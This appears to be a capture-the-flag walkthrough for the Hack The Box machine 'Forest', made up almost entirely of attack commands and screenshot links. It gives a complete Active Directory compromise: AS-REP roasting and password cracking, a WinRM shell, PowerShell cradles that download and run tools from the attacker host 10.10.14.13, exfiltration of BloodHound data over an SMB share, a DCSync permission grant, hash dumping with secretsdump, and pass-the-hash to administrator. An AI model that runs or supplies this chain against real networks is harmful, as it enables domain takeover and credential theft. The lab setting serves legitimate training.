```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
enum4linux 10.10.10.161
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
SharpHound.ps1
BloodHound
CanPSRemote
secretsdump.py
psexec.py / wmiexec.py
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.10.161
```
![image](https://github.com/regarmulia/HTB/assets/33616880/09d1c960-d99a-4595-8c11-b9c0d1612465)


```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
grep PrincipalName ldapsearch.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/2d1bca0f-df1d-4d9e-8722-41643add32cc)

![image](https://github.com/regarmulia/HTB/assets/33616880/f328f6e7-861f-4b4c-94d0-3259e5d82907)
![image](https://github.com/regarmulia/HTB/assets/33616880/e64f2ccd-8f69-440b-bc52-c1a8ba5a99d2)


```
enum4linux 10.10.10.161
```
![image](https://github.com/regarmulia/HTB/assets/33616880/356699b9-c822-433f-9532-4c79b9d23d13)
![image](https://github.com/regarmulia/HTB/assets/33616880/b8648246-f916-427a-af99-942c65d17d42)


```
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
john hash_svc -w=/usr/share/wordlists/rockyou.txt
svc-alfresco | s3rvice
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fac35ad7-2c9f-48f8-a66e-09bcfab14d92)


```
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0cb0e9ed-0fcf-4be0-9e0c-4983ea641a52)


# SharpHound
```
iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
```
```
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```
![image](https://user-images.githubusercontent.com/33616880/228747631-d9e4cd27-7ef2-418b-83f3-bf65f8a4a100.png)
![image](https://user-images.githubusercontent.com/33616880/228747656-8d33da1f-b566-403e-a2f3-a4f822120c86.png)


# Copy to Kali
```
./smbserver.py share . -smb2support -username df -password df
```
```
net use \\10.10.14.13\share /u:df df
copy 20230329201446_BloodHound.zip \\10.10.14.13\share\
```
![image](https://user-images.githubusercontent.com/33616880/228748422-ad9ea303-8024-44d4-bcc5-27d3085d3a24.png)
![image](https://user-images.githubusercontent.com/33616880/228748440-68cde53c-8e2b-44f7-b672-7da04a1a6ae7.png)
![image](https://user-images.githubusercontent.com/33616880/228748470-44ad4e6d-1f5d-4938-8850-657fcb3f07d8.png)

# Open BloodHound
```
neo4j console
```
```
./BloodHound --no-sandbox
```
![image](https://user-images.githubusercontent.com/33616880/228749045-07d902b9-414d-4c06-9d03-51c1f168af9a.png)
![image](https://user-images.githubusercontent.com/33616880/228749059-b033ae44-a51a-4bc8-99e9-e506912330b6.png)
![image](https://user-images.githubusercontent.com/33616880/228749077-97736392-a3bf-487f-a241-7185071cb89c.png)


# PrivExec
```
iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```
![image](https://user-images.githubusercontent.com/33616880/228749660-817a3ba7-36da-47d6-b7a4-0931bc4ab696.png)
![image](https://user-images.githubusercontent.com/33616880/228749695-ae4ac63d-d4de-4ee2-983b-45b42c936ba2.png)

```
./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```
![image](https://user-images.githubusercontent.com/33616880/228750251-f0a28183-07eb-45dc-8dc9-9e196446d932.png)
![image](https://user-images.githubusercontent.com/33616880/228750276-e41cdd61-01d0-4e2a-a8f0-297a4f19f098.png)

```
./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
```
![image](https://user-images.githubusercontent.com/33616880/228750594-596cfeb8-b198-4a99-9807-590e11acd089.png)
OR
```
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```
![image](https://user-images.githubusercontent.com/33616880/228751819-f64860be-ce06-4835-9eb7-75f16ecb31e3.png)
